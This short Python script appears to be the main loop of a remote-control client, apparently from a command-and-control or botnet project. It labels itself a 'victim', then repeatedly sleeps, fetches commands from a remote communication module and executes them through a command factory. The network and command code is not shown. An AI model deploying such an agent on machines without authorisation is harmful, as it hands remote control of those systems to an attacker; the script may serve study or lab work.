import time
from client.Timer import Timer
import client.communication as c

from controllers.CommandFactory import CommandFactory

if __name__ == '__main__':
    print("I'm a victim!")
    command_obj = CommandFactory()
    while True:
        time.sleep(Timer.get_seconds())
        data = c.get_commands()

        for com in data:
            print(command_obj.create_command(com["com"], com["params"]).run())
